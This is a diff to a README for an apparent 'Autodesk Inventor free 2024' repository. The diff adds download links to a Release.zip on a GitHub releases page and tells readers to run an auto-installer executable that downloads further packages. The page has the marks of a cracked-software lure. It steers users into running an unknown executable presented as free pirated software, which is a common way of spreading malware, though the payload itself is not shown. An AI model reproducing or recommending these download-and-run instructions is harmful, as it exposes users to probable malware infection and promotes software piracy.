@@ -8,11 +8,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/b57ba6c7-6867-4f4f-b340-2d406a3a42df)
-]()
+](https://github.com/omerx01/Autodesk-Inventor-free-2024/releases/download/V6.34/Release.zip)
 
 
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/omerx01/Autodesk-Inventor-free-2024/releases/download/V6.34/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![photo_2024-10-24_14-26-07](https://github.com/user-attachments/assets/462bed1d-a097-4204-8a7b-a6be5b10bf79)
